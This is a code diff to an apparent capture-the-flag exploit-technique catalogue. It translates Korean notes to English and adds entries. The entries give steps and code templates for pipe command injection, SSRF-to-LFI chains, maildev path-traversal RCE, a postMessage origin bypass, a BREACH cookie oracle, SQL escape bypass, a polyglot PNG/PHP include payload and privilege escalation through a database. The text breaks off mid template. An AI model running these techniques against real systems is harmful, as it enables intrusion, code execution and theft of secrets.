@@ -1109,24 +1109,23 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "Memstorage pipe/newline command injection — multi-command execution via delimiter in user input",
             "applies_when": (
-                "TCP 기반 custom protocol 서버의 parseCommand가 `|` 또는 `\\n`으로 "
-                "input을 split하고, HTTP endpoint에서 받은 user input이 그대로 "
-                "protocol stream에 포함되는 경우. key/value 파라미터에 `|CMD arg`를 주입하면 "
-                "임의 protocol command 실행."
+                "A TCP-based custom protocol server's parseCommand splits input on `|` or `\\n`, "
+                "and user input from an HTTP endpoint is included directly in the protocol stream. "
+                "Injecting `|CMD arg` into key/value parameters executes arbitrary protocol commands."
             ),
             "prerequisites": [
-                "TCP custom protocol: parseCommand가 input.split(/\\n|\\|/) 로 명령어 분리",
-                "HTTP→TCP bridge: Express 등이 URL param을 memstorage protocol로 전달",
-                "사용자 입력에 대한 pipe/newline sanitization 없음 (또는 우회 가능)",
+                "TCP custom protocol: parseCommand splits commands via input.split(/\\n|\\|/)",
+                "HTTP→TCP bridge: Express etc. passes URL params to memstorage protocol",
+                "No pipe/newline sanitization on user input (or bypassable)",
             ],
             "technique_steps_md": (
-                "1. memstorage.js parseCommand 분석 — split delimiter 확인 (`/\\n|\\|/`)\n"
-                "2. VALID_CMDS 목록에서 유용한 command 식별 (AUTH, AUTH_S, GET, SET, BYE 등)\n"
-                "3. HTTP endpoint (e.g. `/get/:key`)를 통해 key에 pipe 주입:\n"
+                "1. Analyze memstorage.js parseCommand — identify split delimiter (`/\\n|\\|/`)\n"
+                "2. Identify useful commands from VALID_CMDS list (AUTH, AUTH_S, GET, SET, BYE, etc.)\n"
+                "3. Inject pipe into key via HTTP endpoint (e.g. `/get/:key`):\n"
                 "   `GET /get/test|AUTH_S <hex_creds> <hex_payload>|BYE`\n"
-                "4. Express가 memstorage TCP에 `GET test|AUTH_S ... |BYE` 전송\n"
-                "5. parseCommand가 pipe에서 split → 3개 명령어 (GET, AUTH_S, BYE) 순차 실행\n"
-                "6. AUTH_S 결과로 Visit=> 패턴이 response에 포함되면 SSRF chain 발동"
+                "4. Express sends `GET test|AUTH_S ... |BYE` to memstorage TCP\n"
+                "5. parseCommand splits on pipe → 3 commands (GET, AUTH_S, BYE) executed sequentially\n"
+                "6. If AUTH_S result includes Visit=> pattern in response, SSRF chain triggers"
             ),
             "code_template": (
                 "import urllib.parse\n"
@@ -1143,8 +1142,8 @@ TECHNIQUES: list[dict] = [
                     "auth_cmd": "AUTH_S <hex_id> <hex_pw_or_payload>",
                 },
                 "notes": (
-                    "input filter가 없으면 직접 pipe injection 가능. "
-                    "AUTH_S hex 디코딩 결과에 Visit=> payload 포함."
+                    "Direct pipe injection possible if no input filter is present. "
+                    "AUTH_S hex-decoded result contains the Visit=> payload."
                 ),
             }],
             "tags": ["command-injection", "pipe", "newline", "protocol", "memstorage", "tcp", "parseCommand"],
@@ -1160,17 +1159,17 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "Visit=> response-driven SSRF chain — secondary request via response body pattern",
             "applies_when": (
-                "debug_Get/api_Get 류 함수가 첫 번째 HTTP response body에서 "
-                "'Visit=>URL' 패턴을 찾으면 URL을 추출하여 두 번째 요청(api_Get)을 보내는 경우. "
-                "첫 번째 response에 Visit=>file:///flag.txt를 삽입하면 LFI 달성."
+                "A debug_Get/api_Get-style function searches the first HTTP response body for the "
+                "'Visit=>URL' pattern, extracts the URL, and sends a second request (api_Get). "
+                "Injecting Visit=>file:///flag.txt into the first response achieves LFI."
             ),
             "prerequisites": [
-                "PHP debug_Get: response에서 strpos('Visit=>') → explode → api_Get(next_url)",
-                "api_Get이 curl을 사용하여 file:// scheme 지원",
-                "첫 번째 response body에 Visit=>payload를 삽입할 수 있는 injection point",
+                "PHP debug_Get: strpos('Visit=>') on response → explode → api_Get(next_url)",
+                "api_Get uses curl, supporting file:// scheme",
+                "Injection point available to insert Visit=>payload into first response body",
             ],
             "technique_steps_md": (
-                "1. debug_Get 함수 분석:\n"
+                "1. Analyze debug_Get function:\n"
                 "   ```php\n"
                 "   function debug_Get($url) {\n"
                 "       $response = file_get_contents($url);\n"
@@ -1181,10 +1180,10 @@ TECHNIQUES: list[dict] = [
                 "       return $response;\n"
                 "   }\n"
                 "   ```\n"
-                "2. api_Get은 curl 기반 — file:// schema 지원 확인\n"
-                "3. 첫 번째 request의 response에 `Visit=>file:///flag.txt` 문자열을 삽입\n"
-                "   (e.g. memstorage AUTH_S 에러메시지에 hex-decoded payload 포함)\n"
-                "4. debug_Get이 `file:///flag.txt`를 추출 → api_Get(file:///flag.txt) → 플래그 반환"
+                "2. api_Get is curl-based — confirm file:// scheme support\n"
+                "3. Insert `Visit=>file:///flag.txt` string into the first request's response\n"
+                "   (e.g. hex-decoded payload included in memstorage AUTH_S error message)\n"
+                "4. debug_Get extracts `file:///flag.txt` → api_Get(file:///flag.txt) → returns flag"
             ),
             "code_template": (
                 "# Craft a URL that will make the server return Visit=>file:///flag.txt\n"
@@ -1203,8 +1202,8 @@ TECHNIQUES: list[dict] = [
                     "injected_url": "file:///flag.txt",
                 },
                 "notes": (
-                    "AUTH_S의 hex-decoded error response에 Visit=>file:///flag.txt가 포함되어 "
-                    "debug_Get이 file:///flag.txt를 curl로 읽어 flag 반환."
+                    "AUTH_S hex-decoded error response contains Visit=>file:///flag.txt, "
+                    "causing debug_Get to read file:///flag.txt via curl and return the flag."
                 ),
             }, {
                 "params": {
@@ -1213,8 +1212,8 @@ TECHNIQUES: list[dict] = [
                     "injected_url": "file:///flag.txt",
                 },
                 "notes": (
-                    "fsockopen으로 memstorage에서 Visit=> 응답 확인 가능하나, "
-                    "PHP 8.2+ file_get_contents HTTP parser가 raw TCP 응답을 거부할 수 있음."
+                    "Visit=> response can be verified from memstorage via fsockopen, "
+                    "but PHP 8.2+ file_get_contents HTTP parser may reject raw TCP responses."
                 ),
             }],
             "tags": ["ssrf", "visit", "redirect", "file-read", "lfi", "curl", "chain", "debug_Get"],
@@ -1230,35 +1229,36 @@ TECHNIQUES: list[dict] = [
             "kind": "exploit_technique",
             "name": "HTTP-to-TCP protocol confusion — file_get_contents(http://) to raw TCP service",
             "applies_when": (
-                "PHP의 file_get_contents('http://host:port/path')가 raw TCP 서비스 (non-HTTP)에 "
-                "연결될 때, HTTP request line과 headers가 TCP protocol의 명령어로 해석되는 경우. "
-                "GET /path HTTP/1.0 자체가 custom protocol의 입력이 됨."
+                "When PHP's file_get_contents('http://host:port/path') connects to a raw TCP service "
+                "(non-HTTP), the HTTP request line and headers are interpreted as commands by the TCP "
+                "protocol. GET /path HTTP/1.0 itself becomes input to the custom protocol."
             ),
             "prerequisites": [
-                "PHP file_get_contents + http:// stream wrapper 사용",
-                "target이 raw TCP 서비스 (e.g. memstorage on port 9091)",
-                "TCP 서비스의 parseCommand가 HTTP request line을 (부분적으로) 처리",
-                "PHP version에 따라 raw TCP response를 HTTP로 parse하는 strict level이 다름",
+                "PHP file_get_contents + http:// stream wrapper in use",
+                "Target is a raw TCP service (e.g. memstorage on port 9091)",
+                "TCP service's parseCommand (partially) processes the HTTP request line",
+                "Strictness of parsing raw TCP response as HTTP varies by PHP version",
             ],
             "technique_steps_md": (
-                "1. debug action이 `http://api:9091/` URL을 file_get_contents로 요청하도록 유도\n"
-                "2. PHP가 보내는 실제 데이터:\n"
+                "1. Induce debug action to request `http://api:9091/` URL via file_get_contents\n"
+                "2. Actual data PHP sends:\n"
                 "   ```\n"
                 "   GET /CMD1|CMD2|CMD3 HTTP/1.0\\r\\n\n"
                 "   Host: api:9091\\r\\n\n"
                 "   \\r\\n\n"
                 "   ```\n"
-                "3. memstorage parseCommand가 이 중 `GET /CMD1|CMD2|CMD3` 부분을 split:\n"
+                "3. memstorage parseCommand splits `GET /CMD1|CMD2|CMD3`:\n"
                 "   - `GET /CMD1` (invalid → skip)\n"
-                "   - `CMD2` (valid command 실행)\n"
-                "   - `CMD3` (valid command 실행)\n"
-                "4. 단, PHP의 HTTP stream wrapper가 응답의 첫 줄을 HTTP status line으로 기대 —\n"
-                "   raw TCP 응답은 보통 실패. PHP 버전에 따라 ignore_errors로 우회 가능할 수도 있음.\n"
-                "5. 우회 전략: PHP가 fsockopen으로 직접 TCP 통신하거나, \n"
-                "   memstorage 응답의 첫 줄을 HTTP/1.x 형태로 만드는 trick."
+                "   - `CMD2` (valid command executed)\n"
+                "   - `CMD3` (valid command executed)\n"
+                "4. However, PHP's HTTP stream wrapper expects the first line of the response to be an "
+                "HTTP status line — raw TCP responses usually fail. May be bypassable with ignore_errors "
+                "depending on PHP version.\n"
+                "5. Bypass strategy: use fsockopen for direct TCP communication from PHP, or "
+                "trick memstorage response into starting with an HTTP/1.x-like first line."
             ),
             "code_template": (
-                "# PHP debug action에 raw TCP service URL 전달\n"
+                "# Pass raw TCP service URL to PHP debug action\n"
                 "import urllib.parse\n"
                 "cmd_payload = 'AUTH_S 0d0a0d0a ' + 'file:///flag.txt'.encode().hex() + '|BYE'\n"
                 "debug_url = f'http://api:9091/{urllib.parse.quote(cmd_payload, safe=\"\")}'\n"
@@ -1273,44 +1273,44 @@ TECHNIQUES: list[dict] = [
                     "http_request_as_command": "GET /payload HTTP/1.0 → parseCommand splits on |",
                 },
                 "notes": (
-                    "PHP 8.2+에서 file_get_contents가 raw TCP 응답을 "
-                    "HTTP header로 parse하려 하여 실패할 수 있음. fsockopen 직접 TCP는 성공. "
-                    "PHP 버전에 따라 file_get_contents로도 동작 가능."
+                    "In PHP 8.2+, file_get_contents may fail when trying to parse raw TCP "
+                    "responses as HTTP headers. Direct TCP via fsockopen succeeds. "
+                    "file_get_contents may also work depending on PHP version."
                 ),
             }],
             "tags": ["protocol-confusion", "http-to-tcp", "file_get_contents", "ssrf", "memstorage", "raw-tcp"],
         },
     },
 
-    # ── 22. SMTP Content-ID path traversal → arbitrary file write → RCE ──
+    # ── 22. SMTP Content-ID path traversal → arbitrary file write → RCE ────
     {
         "name": "smtp_content_id_path_traversal_rce",
         "vuln_type": "path_traversal",
         "attack_metadata": {
             "name": "SMTP Content-ID path traversal → arbitrary file write → RCE",
             "applies_when": (
-                "메일 서버(예: maildev)가 첨부파일 저장 시 Content-ID 헤더 값을 "
-                "파일명으로 직접 사용하고 path sanitization이 없는 경우. "
-                "첨부파일의 Content-ID에 `../` 시퀀스를 넣어 서버의 소스코드 파일을 덮어쓸 수 있으며, "
-                "서버 재시작 시 덮어쓴 코드가 실행되어 RCE 달성."
+                "A mail server (e.g. maildev) uses the Content-ID header value directly as the "
+                "filename when saving attachments, with no path sanitization. "
+                "Inserting `../` sequences in the attachment's Content-ID can overwrite server source "
+                "code files, and the overwritten code executes on server restart, achieving RCE."
             ),
             "prerequisites": [
-                "SMTP 포트(기본 1025)에 인증 없이 메일 전송 가능",
-                "메일 서버가 첨부파일 저장 시 Content-ID를 그대로 fs.createWriteStream에 전달",
-                "서버의 소스코드 파일 경로를 알고 있거나 추측 가능 (예: /home/node/lib/routes.js)",
-                "서버가 주기적으로 재시작되거나 재시작을 유발할 수 있음",
+                "Mail can be sent to the SMTP port (default 1025) without authentication",
+                "Mail server passes Content-ID directly to fs.createWriteStream when saving attachments",
+                "Server source code file path is known or guessable (e.g. /home/node/lib/routes.js)",
+                "Server restarts periodically or a restart can be triggered",
             ],
             "technique_steps_md": (
-                "1. 대상 메일 서버의 첨부파일 저장 로직 분석 — `saveAttachment(id, attachment)` 확인\n"
-                "2. `fs.createWriteStream(path.join(mailDir, id, attachment.contentId))` 형태면 취약\n"
-                "3. 첨부파일 저장 경로(`/tmp/maildev-<pid>/<id>/`)에서 타겟 파일까지의 상대 경로 계산:\n"
-                "   - 예: `/tmp/maildev-1/<id>/` → `/home/node/lib/routes.js` = `../../../home/node/lib/routes.js`\n"
-                "4. 악성 코드가 담긴 첨부파일을 Content-ID 헤더에 path traversal 포함하여 메일 전송:\n"
+                "1. Analyze the mail server's attachment save logic — check `saveAttachment(id, attachment)`\n"
+                "2. Vulnerable if pattern is `fs.createWriteStream(path.join(mailDir, id, attachment.contentId))`\n"
+                "3. Calculate relative path from attachment save directory (`/tmp/maildev-<pid>/<id>/`) to target file:\n"
+                "   - e.g.: `/tmp/maildev-1/<id>/` → `/home/node/lib/routes.js` = `../../../home/node/lib/routes.js`\n"
+                "4. Send email with malicious code in attachment, Content-ID header containing path traversal:\n"
                 "   ```python\n"
                 "   attachment.add_header('Content-ID', '<../../../home/node/lib/routes.js>')\n"
                 "   ```\n"
-                "5. 악성 routes.js 내용: flag 파일 읽기 + HTTP endpoint로 노출\n"
-                "6. 서버 재시작 대기 (또는 유발) → 덮어쓴 코드 로드 → /flag 접근으로 플래그 획득"
+                "5. Malicious routes.js content: read flag file + expose via HTTP endpoint\n"
+                "6. Wait for (or trigger) server restart → overwritten code is loaded → access /flag to get the flag"
             ),
             "code_template": (
                 "import smtplib\n"
@@ -1347,37 +1347,38 @@ TECHNIQUES: list[dict] = [
                     "flag_path": "/flag",
                 },
                 "notes": (
-                    "maildev 2.0.x의 saveAttachment가 Content-ID를 path.join에 직접 전달. "
-                    "서버 재시작 후 덮어쓴 routes.js가 require되어 RCE. "
-                    "CVE-2024-27448로 등록됨."
+                    "maildev 2.0.x saveAttachment passes Content-ID directly to path.join. "
+                    "After server restart, overwritten routes.js is require'd, achieving RCE. "
+                    "Registered as CVE-2024-27448."
                 ),
             }],
             "tags": ["smtp", "content-id", "path-traversal", "arbitrary-file-write", "rce", "maildev", "node"],
         },
     },
 
-    # ── 23. Express req property traversal via search/getdata ──
+    # ── 23. Express req property traversal via search/getdata ───
     {
         "name": "express_req_property_traversal_leak",
         "vuln_type": "information_disclosure",
         "attack_metadata": {
             "name": "Express req object property traversal — cookie/header leak",
             "applies_when": (
-                "서버가 사용자 입력(key)과 Express req 객체를 getdata/resolve 형태 함수에 함께 넘길 때. "
-                "getdata(key, value, req) 형태에서 key = 'cookies.sessionId' 등으로 "
-                "req.cookies, req.headers, req.query 등 내부 속성에 접근 가능."
+                "The server passes user input (key) along with the Express req object to a "
+                "getdata/resolve-style function. In a getdata(key, value, req) pattern, "
+                "key = 'cookies.sessionId' etc. can access internal properties like "
+                "req.cookies, req.headers, req.query."
             ),
             "prerequisites": [
-                "서버 핸들러가 req 객체를 generic data resolver에 직접 전달",
-                "key가 dot(.) 또는 delimiter로 분리되어 재귀 접근",
-                "prototype/constructor blocklist에 cookies, headers 등이 빠져 있음",
+                "Server handler passes req object directly to a generic data resolver",
+                "Key is split by dot (.) or delimiter for recursive access",
+                "Blocklist for prototype/constructor does not include cookies, headers, etc.",
             ],
             "technique_steps_md": (
-                "1. /search 등 엔드포인트의 data resolver 분석 — 3번째 인자가 `req`인지 확인\n"
-                "2. `getdata(key, value, data)` 에서 key에 dot-path 사용: `cookies.key`\n"
-                "3. `value='*'`이면 모든 하위 속성 열거, 특정 값이면 해당 키만 반환\n"
-                "4. 요청에 cookie 포함 시 → 응답에 `<p id=key>cookie_value</p>` 형태로 누출\n"
-                "5. headers, query, body 등 req의 다른 속성도 동일하게 접근 가능"
+                "1. Analyze data resolver at /search endpoint — check if 3rd argument is `req`\n"
+                "2. Use dot-path in key for `getdata(key, value, data)`: `cookies.key`\n"
+                "3. If `value='*'`, enumerate all sub-properties; specific value returns that key only\n"
+                "4. When request includes cookies → leaked in response as `<p id=key>cookie_value</p>`\n"
+                "5. Other req properties (headers, query, body, etc.) are accessible the same way"
             ),
             "code_template": (
                 "import requests\n"
@@ -1400,40 +1401,40 @@ TECHNIQUES: list[dict] = [
                     "key_payload": "cookies or cookies.key",
                 },
                 "notes": (
-                    "blocklist에 __proto__, prototype, constructor만 있고 "
-                    "cookies, headers, query 등은 차단하지 않음. "
-                    "value='*'이면 전체, 특정 key 지정이면 해당 값만 반환."
+                    "Blocklist only contains __proto__, prototype, constructor — "
+                    "cookies, headers, query, etc. are not blocked. "
+                    "value='*' returns all properties; specifying a key returns that value only."
                 ),
             }],
             "tags": ["express", "req-traversal", "cookie-leak", "information-disclosure", "property-access"],
         },
     },
 
-    # ── 24. isSameSite null origin bypass ──
+    # ── 24. isSameSite null origin bypass ────────────────────────
     {
         "name": "isamesite_null_origin_bypass",
         "vuln_type": "access_control_bypass",
         "attack_metadata": {
             "name": "postMessage isSameSite check bypass via null origin",
             "applies_when": (
-                "클라이언트 JS가 postMessage 수신 시 isSameSite(window.origin, e.origin) 검사를 하고, "
-                "isSameSite 구현이 origin.slice(7).split('.').slice(-2).join('.').endsWith(...) "
-                "형태일 때. data: URL, sandbox iframe, blob: URL 등에서 e.origin='null'이 되면 "
-                "'null'.slice(7)='' → endsWith('')=true 로 항상 통과."
+                "Client-side JS checks isSameSite(window.origin, e.origin) on postMessage receipt, "
+                "and the isSameSite implementation uses origin.slice(7).split('.').slice(-2).join('.').endsWith(...). "
+                "When e.origin='null' from data: URL, sandbox iframe, or blob: URL, "
+                "'null'.slice(7)='' → endsWith('')=true, always passing."
             ),
             "prerequisites": [
-                "대상 페이지가 postMessage 이벤트 리스너에서 origin 검사 수행",
-                "isSameSite가 slice(7) + endsWith 패턴 사용",
-                "공격자가 data: URL 또는 sandboxed iframe에서 postMessage 전송 가능",
+                "Target page performs origin check in postMessage event listener",
+                "isSameSite uses slice(7) + endsWith pattern",
+                "Attacker can send postMessage from data: URL or sandboxed iframe",
             ],
             "technique_steps_md": (
-                "1. 대상 페이지의 message event listener 분석 — isSameSite 로직 확인\n"
-                "2. `origin.slice(7)` → 'http://' 제거 의도지만, 'null'에서는 빈 문자열\n"
+                "1. Analyze target page's message event listener — check isSameSite logic\n"
+                "2. `origin.slice(7)` → intended to strip 'http://', but returns empty string for 'null'\n"
                 "3. `''.split('.').slice(-2).join('.')` = `''`\n"
-                "4. `anything.endsWith('')` = `true` — 항상 통과\n"
-                "5. 공격자 페이지에서 sandbox iframe + allow-same-origin으로 data: URL 로드\n"
-                "6. data: URL 내에서 window.open으로 대상 열고, iframe에 postMessage 전송\n"
-                "7. MessageChannel 포트 전달로 양방향 통신 확보"
+                "4. `anything.endsWith('')` = `true` — always passes\n"
+                "5. Load data: URL in sandbox iframe + allow-same-origin on attacker page\n"
+                "6. Inside data: URL, open target with window.open and send postMessage to iframe\n"
+                "7. Establish bidirectional communication via MessageChannel port transfer"
             ),
             "code_template": (
                 "<!-- Attacker page -->\n"
@@ -1457,41 +1458,41 @@ TECHNIQUES: list[dict] = [
                     "bypass_reason": "'null'.slice(7)='' → endsWith('')=true",
                 },
                 "notes": (
-                    "sandbox iframe에 allow-same-origin 필요. "
-                    "MessageChannel로 양방향 통신 후 window 속성 설정(debug mode 등) 가능."
+                    "allow-same-origin required on sandbox iframe. "
+                    "After bidirectional communication via MessageChannel, window properties can be set (debug mode, etc.)."
                 ),
             }],
             "tags": ["postmessage", "origin-bypass", "null-origin", "sandbox", "isamesite", "messagechannel"],
         },
     },
 
-    # ── 25. BREACH gzip compression side-channel ──
+    # ── 25. BREACH gzip compression side-channel ────────────────
     {
         "name": "breach_gzip_compression_side_channel",
         "vuln_type": "information_disclosure",
         "attack_metadata": {
             "name": "BREACH gzip compression side-channel for secret extraction",
             "applies_when": (
-                "서버 응답이 gzip 압축되고, 같은 응답 안에 (1) secret 값(쿠키 등)과 "
-                "(2) 공격자가 제어하는 텍스트가 함께 포함될 때. "
-                "추측 문자가 secret의 접두사와 일치하면 gzip이 더 효율적으로 압축 "
-                "→ Content-Length가 더 작아짐 → 1문자씩 brute-force 가능."
+                "Server response is gzip compressed, and the same response contains both "
+                "(1) a secret value (cookie, etc.) and (2) attacker-controlled text. "
+                "When the guessed characters match the secret's prefix, gzip compresses more "
+                "efficiently → smaller Content-Length → character-by-character brute-force possible."
             ),
             "prerequisites": [
-                "응답에 gzip/deflate 압축 적용 (flask-compress, nginx gzip 등)",
-                "응답에 secret(cookie 값 등)이 반사(reflection)됨",
-                "공격자가 같은 응답에 임의 텍스트를 삽입 가능",
-                "Content-Length를 관측할 수 있는 오라클 존재 (debug mode, timing 등)",
+                "Response has gzip/deflate compression (flask-compress, nginx gzip, etc.)",
+                "Secret (cookie value, etc.) is reflected in the response",
+                "Attacker can insert arbitrary text into the same response",
+                "Oracle exists to observe Content-Length (debug mode, timing, etc.)",
             ],
             "technique_steps_md": (
-                "1. 응답에 secret이 포함되는 엔드포인트 식별 (예: /search에서 cookies 반사)\n"
-                "2. 같은 응답에 추측 문자열 삽입 — 예: query에 'cookies.*' + '<p id=key>token{s' 동시 전달\n"
-                "3. gzip 압축 후 Content-Length 비교:\n"
-                "   - 올바른 접두사: '<p id=key>token{s'가 실제 '<p id=key>token{s3cr3t...'와 겹침 → 더 작은 CL\n"
-                "   - 틀린 접두사: '<p id=key>token{x'는 겹치지 않음 → 더 큰 CL\n"
-                "4. Δ(Content-Length) 보통 1-3바이트 차이로 식별 가능\n"
-                "5. padding(\\x01 * N)으로 압축 컨텍스트 확장하여 oracle 정확도 향상\n"
-                "6. 알파벳 순회하며 한 글자씩 추출, 추출된 prefix에 다음 글자 추가 반복"
+                "1. Identify endpoint where secret is included in response (e.g. cookies reflected at /search)\n"
+                "2. Insert guess string into same response — e.g. pass 'cookies.*' + '<p id=key>token{s' in query\n"
+                "3. Compare Content-Length after gzip compression:\n"
+                "   - Correct prefix: '<p id=key>token{s' overlaps with actual '<p id=key>token{s3cr3t...' → smaller CL\n"
+                "   - Wrong prefix: '<p id=key>token{x' has no overlap → larger CL\n"
+                "4. Δ(Content-Length) is typically 1-3 bytes difference, identifiable\n"
+                "5. Expand compression context with padding (\\x01 * N) to improve oracle accuracy\n"
+                "6. Iterate through alphabet extracting one character at a time, appending to extracted prefix"
             ),
             "code_template": (
                 "import requests\n\n"
@@ -1523,13 +1524,185 @@ TECHNIQUES: list[dict] = [
                     "delta": "2 bytes per correct character",
                 },
                 "notes": (
-                    "Flask-compress 기본 최소 크기 500바이트 — 응답이 충분히 커야 gzip 적용. "
-                    "user data 함께 조회하여 임계값 초과. "
-                    "debug mode(window.debug.param='Content-Length')로 "
-                    "fetch response header를 MessageChannel로 전달받아 oracle 구성."
+                    "Flask-compress default minimum size is 500 bytes — response must be large enough for gzip. "
+                    "Query user data together to exceed threshold. "
+                    "Use debug mode (window.debug.param='Content-Length') to receive "
+                    "fetch response header via MessageChannel to construct the oracle."
                 ),
             }],
             "tags": ["breach", "compression-oracle", "gzip", "side-channel", "content-length", "cookie-extraction"],
+        },
+    },
+
+    # ── 26. Broken sanitize function → SQL escape bypass for non-string types ──
+    {
+        "name": "python_sql_escape_type_bypass",
+        "vuln_type": "sqli",
+        "attack_metadata": {
+            "name": "Python sql_escape type-confusion bypass — non-string values skip sanitization",
+            "applies_when": (
+                "A Python/Flask API uses a custom sql_escape function that only sanitizes string values "
+                "(isinstance(val, str)) before interpolating into SQL via str.format() or % formatting. "
+                "If the sanitize helper itself has a calling-convention bug (e.g., missing argument) that "
+                "crashes on string inputs, ALL string-bearing requests fail with 500, while non-string JSON "
+                "values (int, bool, dict, list of ints) pass through unescaped. Attackers can submit "
+                "non-string typed JSON values that get format()-interpolated into raw SQL."
+            ),
+            "prerequisites": [
+                "Custom sql_escape iterates JSON body keys and only escapes isinstance(val, str)",
+                "sanitize() function has a calling bug (e.g., sanitize(val) instead of sanitize(conn, val)) causing TypeError on strings",
+                "SQL queries use str.format() or % formatting with the unsanitized values",
+                "express.json() / Flask request.get_json() parses full JSON types (int, bool, dict, null)",
+            ],
+            "technique_steps_md": (
+                "1. Identify sql_escape: check if it only covers isinstance(val, str) — dicts/ints/bools pass through\n"
+                "2. Confirm sanitize bug: send a request with string values → 500 Internal Server Error\n"
+                "3. Send non-string values (integers, bools) that pass sql_escape without error\n"
+                "4. The value is interpolated into SQL via format() — integer pid works for normal queries\n"
+                "5. For UPDATE statements like `checksum = checksum + {}`, non-string values produce valid SQL\n"
+                "6. Combine with direct DB access if available to achieve full exploitation"
+            ),
+            "code_template": (
+                "import requests\n"
+                "# String values crash sql_escape\n"
+                "r = requests.post(f'{url}/endpoint', json={'field': 'string_value'})  # → 500\n"
+                "# Non-string values bypass sql_escape\n"
+                "r = requests.post(f'{url}/endpoint', json={'field': 123})  # → 200, value interpolated raw\n"
+                "# SQL: SELECT * FROM table WHERE field = '123'"
+            ),
+            "examples": [{
+                "params": {
+                    "sql_escape_bug": "sanitize(val) instead of sanitize(conn, val) → TypeError on strings",
+                    "bypass_type": "integer/bool/dict values skip isinstance(val, str) branch",
+                    "affected_endpoints": "All POST endpoints using json_body() → sql_escape()",
+                },
+                "notes": (
+                    "The broken sanitize effectively disables ALL string-based SQL escaping. "
+                    "Normal app functionality (join, login) is broken. Exploitation relies on "
+                    "non-string JSON types or direct DB access."
+                ),
+            }],
+            "tags": ["sqli", "type-confusion", "sanitize-bypass", "python", "flask", "json-type"],
+        },
+    },
+
+    # ── 27. Polyglot PNG + PHP LFI via include with DB-controlled path ──
+    {
+        "name": "polyglot_png_php_include_rce",
+        "vuln_type": "lfi_rce",
+        "attack_metadata": {
+            "name": "Polyglot PNG with appended PHP code + LFI via include with DB-controlled path",
+            "applies_when": (
+                "A PHP app has an `include $path;` statement where $path comes from a database column, "
+                "and the attacker can modify that column (via SQL injection or direct DB access). "
+                "A file upload endpoint validates images via exif_imagetype() / getimagesize() but "
+                "does not strip data after the PNG IEND marker. By appending `<?php ... ?>` after "
+                "the IEND chunk, the file passes image validation while containing executable PHP. "
+                "Setting the DB path to point to the uploaded image triggers PHP execution on include."
+            ),
+            "prerequisites": [
+                "PHP `include $path;` where $path is read from a DB column",
+                "Attacker can modify the DB column (SQLi, direct DB access, or admin feature)",
+                "File upload validates image type (exif_imagetype, getimagesize) but does not re-encode",
+                "short_open_tag = Off (PHP 8.x default) to avoid `<?` in PNG binary triggering parse errors",
+                "No open_basedir restriction blocking the uploaded image path",
+            ],
+            "technique_steps_md": (
+                "1. Create minimal valid PNG (e.g., 1x1 pixel): PNG signature + IHDR + IDAT + IEND\n"
+                "2. Append PHP payload after IEND: `<?php echo file_get_contents('/flag_path'); ?>`\n"
+                "3. Upload the polyglot PNG via the image upload endpoint\n"
+                "4. Capture the server-assigned filename (e.g., sha256(random).png)\n"
+                "5. Modify the DB to set the include path to the uploaded image:\n"
+                "   UPDATE product SET product_cache = '../image/{hash}.png' WHERE pid = N;\n"
+                "6. Trigger the include via the product card endpoint:\n"
+                "   GET /product_card.php?pid=N&cache=../image/{hash}.png\n"
+                "7. PHP outputs PNG binary (garbage) then executes appended PHP → flag in response"
+            ),
+            "code_template": (
+                "import struct, zlib, io, requests, mysql.connector\n\n"
+                "# 1. Build polyglot PNG+PHP\n"
+                "def make_png_php(php_code):\n"
+                "    sig = b'\\x89PNG\\r\\n\\x1a\\n'\n"
+                "    def chunk(t, d): c=t+d; return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xFFFFFFFF)\n"
+                "    ihdr = struct.pack('>IIBBBBB',1,1,8,2,0,0,0)\n"
+                "    raw = b'\\x00\\xff\\x00\\x00'\n"
+                "    return sig + chunk(b'IHDR',ihdr) + chunk(b'IDAT',zlib.compress(raw)) + chunk(b'IEND',b'') + php_code.encode()\n\n"
+                "png = make_png_php('<?php echo file_get_contents(\"{flag_path}\"); ?>')\n"
+                "# 2. Upload\n"
+                "resp = requests.post('{url}/upload', files={{'image': ('e.png', io.BytesIO(png), 'image/png')}})\n"
+                "# 3. Parse filename, 4. Update DB, 5. Trigger include"
+            ),
+            "examples": [{
+                "params": {
+                    "upload_endpoint": "POST /ymp_internal/upload_action.php",
+                    "include_endpoint": "GET /ymp_internal/product_card.php?pid=N&cache=PATH",
+                    "db_column": "product.product_cache",
+                    "image_validation": "exif_imagetype() + getimagesize() + extension allowlist (jpg/png)",
+                    "flag_path": "/flag_*.txt",
+                },
+                "notes": (
+                    "PNG IEND marks the end of image data — anything after it is ignored by image parsers "
+                    "but is processed by PHP's include. The DB path uses relative traversal (../image/) "
+                    "to reach the uploaded file from the include's working directory."
+                ),
+            }],
+            "tags": ["polyglot", "png", "php", "lfi", "include", "rce", "file-upload", "image-validation-bypass"],
+        },
+    },
+
+    # ── 28. Hardcoded DB credentials + exposed port → direct DB manipulation ──
+    {
+        "name": "exposed_db_credentials_direct_manipulation",
+        "vuln_type": "access_control_bypass",
+        "attack_metadata": {
+            "name": "Hardcoded DB credentials with exposed port → direct database manipulation",
+            "applies_when": (
+                "Application source code contains hardcoded database credentials (in config files, "
+                "ORM configs, or PHP/Python source), AND the database port is exposed externally "
+                "(via docker-compose port mapping or firewall misconfiguration). Attackers connect "
+                "directly to the DB, bypassing all application-level access controls, input validation, "
+                "and broken sanitization. Enables: reading secrets, modifying user roles, inserting "
+                "arbitrary records, and setting up further exploitation (e.g., LFI path injection)."
+            ),
+            "prerequisites": [
+                "DB credentials visible in source code (dbutil.py, config.php, .env, docker-compose.yml, etc.)",
+                "Database port reachable from attacker's network (docker-compose ports: mapping, no firewall)",
+                "DB user has sufficient privileges (INSERT, UPDATE, SELECT at minimum)",
+            ],
+            "technique_steps_md": (
+                "1. Identify DB credentials in source: connection strings, config files, docker-compose.yml\n"
+                "2. Confirm DB port is accessible: connect from attacker machine to host:port\n"
+                "3. Enumerate the schema: SHOW TABLES, DESCRIBE table_name\n"
+                "4. Read application secrets: SELECT * FROM config (secret_key, API keys, etc.)\n"
+                "5. Escalate privileges: UPDATE user SET is_admin=1 WHERE username='attacker'\n"
+                "6. Inject exploit data: UPDATE product SET product_cache='../image/malicious.png'\n"
+                "7. Forge auth tokens using extracted secrets if needed"
+            ),
+            "code_template": (
+                "import mysql.connector\n"
+                "conn = mysql.connector.connect(host='{host}', port={db_port},\n"
+                "    user='{db_user}', password='{db_pass}', database='{db_name}')\n"
